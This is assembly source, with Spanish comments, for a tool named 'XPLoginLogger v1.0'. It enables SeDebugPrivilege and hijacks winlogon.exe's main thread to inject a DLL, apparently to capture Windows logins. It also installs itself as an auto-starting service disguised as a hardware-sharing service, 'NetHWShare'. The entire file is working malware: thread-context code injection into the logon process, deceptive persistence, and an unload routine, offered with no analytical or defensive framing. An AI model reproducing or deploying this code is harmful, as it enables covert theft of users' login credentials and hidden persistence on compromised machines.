.486

.model flat,stdcall

option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\shell32.inc
include \masm32\include\comdlg32.inc
include \masm32\include\comctl32.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\comdlg32.lib
includelib \masm32\lib\comctl32.lib
includelib \masm32\lib\advapi32.lib

GetAPIHandle proto :DWORD, :DWORD
GetPath proto :DWORD
InjertaCodigo proto
DesInjertaCodigo proto
Injerto proto
DesInjerto proto
FakeDebugger proto
GetPrivileges proto
InstallService proto
RemoveService proto

PROCESSENTRY32 STRUCT DWORD
    dwSize	            DWORD	?	; Tamaño de esta estructura
    cntUsage	        DWORD	?	; Número de instancias (?)
    th32ProcessID	    DWORD	?	; ProcessID del proceso
    th32DefaultHeapID   DWORD	?	; ID del montículo por defecto
    th32ModuleID	    DWORD	?	; ModuleID exe asociado
    cntThreads	        DWORD	?	; Número de hilos [threads] en el proceso
    th32ParentProcessID	DWORD	?	; ProcessID del proceso padre
    pcPriClassBase		DWORD	?	; Prioridad base de los hilos del proceso
    dwFlags	            DWORD	?	; Reservado
    szExeFile	      	DB 260 dup (?) ; Nombre completo del archivo (incluyendo el camino [path]) del archivo exe propietario del proceso.
PROCESSENTRY32 ENDS

THREADENTRY32 STRUCT DWORD
    dwSize              DWORD ?
    cntUsage            DWORD ?
    th32ThreadID        DWORD ?
    th32OwnerProcessID  DWORD ?
    tpBasePri           DWORD ?
    tpDeltaPri          DWORD ?
    dwFlags             DWORD ?
THREADENTRY32 ENDS

.const

    MAXSIZE                 EQU     260
    TH32CS_SNAPHEAPLIST	    EQU       1
    TH32CS_SNAPPROCESS	    EQU       2
    TH32CS_SNAPTHREAD	    EQU       4
    TH32CS_SNAPMODULE	    EQU       8
    TH32CS_SNAPALL	    	EQU     TH32CS_SNAPHEAPLIST + TH32CS_SNAPPROCESS + TH32CS_SNAPTHREAD + TH32CS_SNAPMODULE
    TH32CS_INHERIT	    	EQU 80000000h


.data
	mytitle              db "XPLoginLogger v1.0",0
	error                db "Couldn't inject the code! :(",0
	ok                   db "Code successfully injected! :D",0
	midll                db "XPLoginLogger.dll",0
	kernel_dll           db "Kernel32.dll",0
	loadlibrary_api      db "LoadLibraryA",0
	openthread_api       db "OpenThread",0
	getmodulehandle_api  db "GetModuleHandleA",0
	freelibrary_api      db "FreeLibrary",0
	openthread           dd 0
	hInstancia		   	 dd 0
	sui                  STARTUPINFO    <>
	pinfo                PROCESS_INFORMATION <>
	programa             db "winlogon.exe",0
	windhand             dd 0
	pid                  dd 0
	phandle              dd 0
	tid                  dd 0
	thandle              dd 0
	cmdline				 dd 0
	hSnapshot            DWORD 0    
	privilegio 			 db "SeDebugPrivilege",0  
	miexe				 db 255 dup(0)
	nombreservicio		 db "NetHWShare",0
	servicio			 db "Detección de Hardware compartido",0
	descripcion			 db "Proporciona configuración automática de los dispositivos compartidos en red.",0
      
 align dword
	ctx                  CONTEXT <>

.data?

pe32 PROCESSENTRY32 <>
te32 THREADENTRY32 <>
align dword
hProcess HANDLE ?
hTokenABC HANDLE ?
tkp TOKEN_PRIVILEGES <>

.code
	start:
	;invoke InitCommonControls
    ;invoke FakeDebugger
    invoke GetPrivileges
	invoke GetModuleHandle, 0
	
	; Aquí simplemente pedimos la ruta de un programa
	mov hInstancia, eax
	
	invoke GetCommandLine
	mov cmdline, eax
	
	invoke lstrlen, cmdline
	
	add eax, cmdline
	dec eax
	dec eax
	mov dx, word ptr [eax]
	.if dx==692Dh
		invoke InstallService
	.elseif dx==642Dh
		invoke RemoveService
		invoke DesInjertaCodigo
		jmp finprog
	.endif
	
	invoke InjertaCodigo
	jmp finprog
    
    push MB_ICONINFORMATION
    push offset mytitle
    .if eax>0
    	push offset error
    .else
        push offset ok
    .endif
    push 0
    call MessageBox
    
    finprog:
	invoke ExitProcess, 0

InstallService proc
	
	local hSCManager:HANDLE
	local hService:HANDLE
	local acDriverPath[MAX_PATH]:CHAR

    invoke OpenSCManager, NULL, NULL, SC_MANAGER_CREATE_SERVICE
    .if eax != NULL
        mov hSCManager, eax

        push eax
        invoke GetModuleFileName, NULL, addr miexe, 255
        pop eax

        invoke CreateService, hSCManager, addr nombreservicio, addr servicio, \
                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, \
                SERVICE_ERROR_IGNORE, addr miexe, NULL, NULL, NULL, NULL, NULL
        .if eax != NULL
            mov hService, eax
            invoke StartService, hService, 0, NULL
            invoke CloseServiceHandle, hService
        .endif
		invoke CloseServiceHandle, hSCManager
    .endif
	ret

InstallService endp

RemoveService proc
	
	local hSCManager:HANDLE
	local hService:HANDLE
	local acDriverPath[MAX_PATH]:CHAR

    invoke OpenSCManager, NULL, NULL, SC_MANAGER_CREATE_SERVICE
    .if eax != NULL
        mov hSCManager, eax

        push eax
        invoke GetModuleFileName, NULL, addr miexe, 255
        pop eax

        invoke OpenService, hSCManager, addr nombreservicio, SERVICE_ALL_ACCESS
        .if eax != NULL
            mov hService, eax
            invoke DeleteService, hService
            invoke CloseServiceHandle, hService
        .endif
		invoke CloseServiceHandle, hSCManager
    .endif
	ret

RemoveService endp

GetPrivileges proc
    invoke GetCurrentProcess
    mov hProcess, eax
    invoke OpenProcessToken,hProcess,TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,addr hTokenABC
    invoke LookupPrivilegeValue, NULL, addr privilegio, addr tkp.Privileges[0].Luid
    mov tkp.PrivilegeCount, 1
    mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
    invoke AdjustTokenPrivileges, hTokenABC, FALSE, addr tkp, 0, NULL, 0
    ret
GetPrivileges endp

FakeDebugger proc
    pushad
    assume fs:nothing
    mov eax, fs:[18h]
    mov eax, dword ptr [eax + 30h]
    mov ecx, dword ptr [eax]
    or ecx, 00010000h
    mov dword ptr [eax], ecx
    popad
    ret
FakeDebugger endp

; Esta función devuelve un puntero al API que le indiquemos
GetAPIHandle proc dll:DWORD, function:DWORD
    invoke GetModuleHandle, dll
    invoke GetProcAddress, eax, function
    ret
GetAPIHandle endp

; Esta función nos devuelve el path actual al programa
GetPath proc buffer:DWORD
    invoke GetModuleFileName, NULL, buffer, 255
    mov ecx, eax
    dec ecx
    mov eax, buffer
    add eax, ecx
    @soloelpath:
    mov dl, byte ptr [eax]
    cmp dl, 5Ch ; Compruebo si es una '\'
    je @findelfiltro
    mov byte ptr [eax], 0 ; Si no es una '\', la borramos
    dec eax
    dec ecx
    jge @soloelpath
    @findelfiltro:
    ret
GetPath endp

GetProcessPointer proc cadena:DWORD
    LOCAL prochandle:DWORD
    invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0	
    ; obtener un handle al snapshot para la  
    ; enumeración de los procesos
    mov hSnapshot, eax	
    ; Guardar el handle al snapshot
    mov pe32.dwSize, sizeof PROCESSENTRY32	
    ; dwSize es el único miembro a llenar
    invoke Process32First, hSnapshot, addr pe32	
    ; Obtener info sobre el primer proceso
    .while eax==TRUE	
    ; Enumerar hasta que no haya otro
    ; proceso
       invoke lstrcmpi, addr pe32.szExeFile, cadena
       or eax, eax
       jne noes
       push pe32.th32ProcessID
       pop prochandle
       noes:
       invoke Process32Next, hSnapshot, addr pe32	
    ; Obtener info sobre procesos
    ; subsecuentes 
    .endw
    invoke CloseHandle, hSnapshot	
    ; Cerrar el handle del snapshot al
    ; terminar la enumeración.
    mov eax, prochandle
    ret
GetProcessPointer endp

GetMainThread proc procesopadre:DWORD
    LOCAL threadhandle:DWORD
    mov threadhandle, 0
    invoke CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, 0	
    ; obtener un handle al snapshot para la  
    ; enumeración de los procesos
    mov hSnapshot, eax	
    ; Guardar el handle al snapshot
    mov te32.dwSize, sizeof THREADENTRY32	
    ; dwSize es el único miembro a llenar
    invoke Thread32First, hSnapshot, addr te32	
    ; Obtener info sobre el primer proceso
    .while eax==TRUE
    ; Enumerar hasta que no haya otro
    ; proceso
       mov eax, te32.th32OwnerProcessID
       mov edx, procesopadre
       cmp eax, edx
       jne noes
       mov eax, te32.th32ThreadID
       .if eax < threadhandle || threadhandle==0
           mov threadhandle, eax
       .endif
       jmp mifin
       noes:
       invoke Thread32Next, hSnapshot, addr te32	
    ; Obtener info sobre procesos
    ; subsecuentes 
    .endw
    mifin:
    invoke CloseHandle, hSnapshot	
    ; Cerrar el handle del snapshot al
    ; terminar la enumeración.
    mov eax, threadhandle
    ret
GetMainThread endp

; Esta función es la que introduce y equilibra el injerto
InjertaCodigo proc

    invoke GetAPIHandle, addr kernel_dll, addr loadlibrary_api
    or eax, eax
    je @ErrorCatastrofico
    mov ptr_loadlibrary, eax
    mov eax, offset path_dll
    push eax
    invoke GetPath, eax
    pop eax
    invoke lstrcat, eax, addr midll
    invoke GetProcessPointer, addr programa
    mov pid, eax
    invoke OpenProcess, PROCESS_ALL_ACCESS,NULL, pid
    or eax, eax
    je @ErrorCatastrofico
    mov phandle, eax
    invoke GetMainThread, pid
    mov tid, eax
    invoke GetAPIHandle, addr kernel_dll, addr openthread_api
    or eax, eax
    je @ErrorCatastrofico
    mov openthread, eax
    push tid
    push 0
    push THREAD_ALL_ACCESS
    call openthread
    or eax, eax
    je @ErrorCatastrofico
    mov thandle, eax
    invoke SuspendThread, thandle
    ; Cojo la información del contexto del hilo principal
    mov ctx.ContextFlags, CONTEXT_CONTROL
    invoke GetThreadContext, thandle, addr ctx
    or eax, eax
    je @ErrorCatastrofico
    ; Ahora le resto 4 al puntero de pila, porque voy a introducir en ella la dirección de retorno
    ; para que después pueda volver al punto de origen usando un RET
    mov eax, ctx.regEsp
    sub eax, 4
    mov ctx.regEsp, eax
    mov eax, offset ctx.regEip
    mov ecx, ctx.regEsp
    ; y lo escribo
    invoke WriteProcessMemory, phandle, ecx, eax, 4, NULL
    or eax, eax
    je @ErrorCatastrofico
    ; Calculo el tamaño del injerto y reservo memoria en el otro proceso
    mov ecx, offset @InjertoEnd
    sub ecx, offset @InjertoStart
    dec ecx
    push ecx
    invoke VirtualAllocEx, phandle, NULL, ecx, MEM_COMMIT, PAGE_EXECUTE_READWRITE
    or eax, eax
    pop ecx
    je @ErrorCatastrofico
    ; Ajusto el injerto para que funcione, cambiando las direcciones de memoria por la dirección de
    ; memoria base (junto con su desplazamiento) que he obtenido antes al hacer la reserva.
    push ecx
    mov edx, offset @InjertoStart
    add edx, 2
    lea ecx, [eax + 0Fh]
    mov [edx], ecx
    add edx, 5
    lea ecx, [eax + 13h]
    mov [edx], ecx
    sub edx, 7
    pop ecx
    push eax
    ; Y por fin escribo el injerto
    invoke WriteProcessMemory, phandle, eax, edx, ecx, NULL
    or eax, eax
    pop eax
    je @ErrorCatastrofico
    ; Cambio el punto de ejecución inicial apuntando a nuestro injerto
    mov ctx.regEip, eax
    ; introduzco el nuevo contexto en el programa
    invoke SetThreadContext, thandle, addr ctx
    or eax, eax
    je @ErrorCatastrofico
    ; y continúo la ejecución del mismo :)
    invoke ResumeThread, thandle
    invoke CloseHandle, thandle
    invoke CloseHandle, phandle
    xor eax, eax
    ret
    
    @ErrorCatastrofico:
    invoke CloseHandle, thandle
    invoke CloseHandle, phandle
    xor eax, eax
    inc eax
    ret
    
InjertaCodigo endp

@InjertoStart:
Injerto proc
    pushad
    mov eax, ptr_loadlibrary
    push offset path_dll
    call eax
    popad
    ret
Injerto endp
ptr_loadlibrary dd 12345678h
path_dll db 256 dup(0)
@InjertoEnd:

; Esta función es la que introduce y equilibra el injerto
DesInjertaCodigo proc

    invoke GetAPIHandle, addr kernel_dll, addr getmodulehandle_api
    or eax, eax
    je @ErrorCatastrofico2
    mov ptr_getmodulehandle, eax
    invoke GetAPIHandle, addr kernel_dll, addr freelibrary_api
    or eax, eax
    je @ErrorCatastrofico2
    mov ptr_freelibrary, eax
    mov eax, offset path_dll2
    push eax
    invoke GetPath, eax
    pop eax
    invoke lstrcat, eax, addr midll
    invoke GetProcessPointer, addr programa
    mov pid, eax
    invoke OpenProcess, PROCESS_ALL_ACCESS,NULL, pid
    or eax, eax
    je @ErrorCatastrofico2
    mov phandle, eax
    invoke GetMainThread, pid
    mov tid, eax
    invoke GetAPIHandle, addr kernel_dll, addr openthread_api
    or eax, eax
    je @ErrorCatastrofico2
    mov openthread, eax
    push tid
    push 0
    push THREAD_ALL_ACCESS
    call openthread
    or eax, eax
    je @ErrorCatastrofico2
    mov thandle, eax
    invoke SuspendThread, thandle
    ; Cojo la información del contexto del hilo principal
    mov ctx.ContextFlags, CONTEXT_CONTROL
    invoke GetThreadContext, thandle, addr ctx
    or eax, eax
    je @ErrorCatastrofico2
    ; Ahora le resto 4 al puntero de pila, porque voy a introducir en ella la dirección de retorno
    ; para que después pueda volver al punto de origen usando un RET
    mov eax, ctx.regEsp
    sub eax, 4
    mov ctx.regEsp, eax
    mov eax, offset ctx.regEip
    mov ecx, ctx.regEsp
    ; y lo escribo
    invoke WriteProcessMemory, phandle, ecx, eax, 4, NULL
    or eax, eax
    je @ErrorCatastrofico2
    ; Calculo el tamaño del injerto y reservo memoria en el otro proceso
    mov ecx, offset @DesInjertoEnd
    sub ecx, offset @DesInjertoStart
    dec ecx
    push ecx
    invoke VirtualAllocEx, phandle, NULL, ecx, MEM_COMMIT, PAGE_EXECUTE_READWRITE
    or eax, eax
    pop ecx
    je @ErrorCatastrofico2
    ; Ajusto el injerto para que funcione, cambiando las direcciones de memoria por la dirección de
    ; memoria base (junto con su desplazamiento) que he obtenido antes al hacer la reserva.
    push ecx
    mov edx, offset @DesInjertoStart
    add edx, 2
    lea ecx, [eax + 18h]
    mov [edx], ecx
    add edx, 5
    lea ecx, [eax + 20h]
    mov [edx], ecx
    add edx, 8
    lea ecx, [eax + 1Ch]
    mov [edx], ecx
    mov edx, offset @DesInjertoStart
    pop ecx
    push eax
    ; Y por fin escribo el injerto
    invoke WriteProcessMemory, phandle, eax, edx, ecx, NULL
    or eax, eax
    pop eax
    je @ErrorCatastrofico2
    ; Cambio el punto de ejecución inicial apuntando a nuestro injerto
    mov ctx.regEip, eax
    ; introduzco el nuevo contexto en el programa
    invoke SetThreadContext, thandle, addr ctx
    or eax, eax
    je @ErrorCatastrofico2
    ; y continúo la ejecución del mismo :)
    invoke ResumeThread, thandle
    invoke CloseHandle, thandle
    invoke CloseHandle, phandle
    xor eax, eax
    ret
    
    @ErrorCatastrofico2:
    invoke CloseHandle, thandle
    invoke CloseHandle, phandle
    xor eax, eax
    inc eax
    ret
    
DesInjertaCodigo endp

@DesInjertoStart:
DesInjerto proc
    pushad
    mov eax, ptr_getmodulehandle
    push offset path_dll
    call eax
    mov edx, ptr_freelibrary
    push eax
    call edx
    popad
    ret
DesInjerto endp
ptr_getmodulehandle dd 12345678h
ptr_freelibrary dd 12345678h
path_dll2 db 256 dup(0)
@DesInjertoEnd:

end start
